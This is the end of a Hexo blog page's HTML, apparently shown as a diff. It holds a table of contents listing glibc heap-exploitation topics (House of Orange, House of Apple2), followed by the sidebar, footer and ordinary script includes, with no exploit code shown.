nav-level-1"><a class="nav-link" href="#4-House-of-Orange"><span class="nav-number">4.</span> <span class="nav-text">4.House of Orange</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-23"><span class="nav-number">4.1.</span> <span class="nav-text">2.23</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-24-2-26"><span class="nav-number">4.2.</span> <span class="nav-text">2.24-2.26</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-House-of-Apple2"><span class="nav-number">5.</span> <span class="nav-text">4.House of Apple2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%881%EF%BC%892-35House-of-Apple2%EF%BC%88system%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">（1）2.35House of Apple2（system）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cexit%E7%9A%84%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">5.1.1.</span> <span class="nav-text">执行exit的流程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E9%87%8C%E5%9B%9E%E7%AD%94%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="nav-number">5.1.2.</span> <span class="nav-text">这里回答一些问题？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B0%86%E8%99%9A%E8%A1%A8%E7%9A%84%E5%9C%B0%E5%9D%80%E5%86%99%E4%B8%BAIO-wfile-jumps"><span class="nav-number">5.1.2.1.</span> <span class="nav-text">1.为什么要将虚表的地址写为IO_wfile_jumps</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-heap2%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%99%E6%A0%B7%E5%B8%83%E5%B1%80"><span class="nav-number">5.1.2.2.</span> <span class="nav-text">2.heap2为什么要这样布局</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E7%BB%93%E5%90%88%E5%89%8D%E9%9D%A2%E7%9A%84%E7%90%86%E8%A7%A3"><span class="nav-number">5.1.2.3.</span> <span class="nav-text">总结：结合前面的理解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%882%EF%BC%892-35-House-of-Apple2%EF%BC%88orw%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">（2）2.35 House of Apple2（orw）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E9%82%A3%E4%B9%88rax-0x28%E7%9A%84%E5%9C%B0%E6%96%B9%E5%86%99%E4%BB%80%E4%B9%88%E5%91%A2"><span class="nav-number">5.2.0.1.</span> <span class="nav-text">1.那么rax+0x28的地方写什么呢</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-IO-save-base%EF%BC%88rbp%EF%BC%89%E8%AF%A5%E4%B8%BA%E5%A4%9A%E5%B0%91"><span class="nav-number">5.2.0.2.</span> <span class="nav-text">2._IO_save_base（rbp）该为多少</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%883%EF%BC%892-35-House-of-Apple2%EF%BC%88puts%EF%BC%89"><span class="nav-number">5.3.</span> <span class="nav-text">（3）2.35 House of Apple2（puts）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%884%EF%BC%892-39-House-of-Apple2%EF%BC%88system%EF%BC%89"><span class="nav-number">5.4.</span> <span class="nav-text">（4）2.39 House of Apple2（system）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%885%EF%BC%892-39-House-of-Apple2%EF%BC%88puts%EF%BC%89"><span class="nav-number">5.5.</span> <span class="nav-text">（5）2.39 House of Apple2（puts）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%886%EF%BC%892-39-House-of-Apple2%EF%BC%88orw%EF%BC%89"><span class="nav-number">5.6.</span> <span class="nav-text">（6）2.39 House of Apple2（orw）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-shellcode"><span class="nav-number">5.6.1.</span> <span class="nav-text">1.shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-ROP-puts"><span class="nav-number">5.6.2.</span> <span class="nav-text">2.ROP puts</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%EF%BC%887%EF%BC%89printf"><span class="nav-number">5.7.</span> <span class="nav-text">（7）printf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%89%80%E6%9C%89%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-number">5.8.</span> <span class="nav-text">总结一下所有的调用链</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">和方煜</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">和方煜</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">123k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:52</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+// 在最后添加
+<script src="/js/code-unfold.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
